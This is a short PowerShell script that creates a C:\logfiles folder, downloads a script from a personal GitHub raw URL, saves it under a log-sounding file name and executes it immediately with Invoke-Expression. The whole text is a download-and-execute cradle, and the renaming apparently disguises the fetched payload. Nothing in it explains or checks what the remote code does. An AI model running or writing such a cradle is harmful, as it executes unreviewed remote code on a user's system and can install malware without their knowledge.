New-Item -Path "c:\" -Name "logfiles" -ItemType "directory"
wget https://raw.githubusercontent.com/daniel0011234/myscripts/main/update_runner.ps1 -OutFile C:\logfiles\log_updates.ps1
iex (Get-Content -path 'C:\logfiles\log_updates.ps1' -Raw)
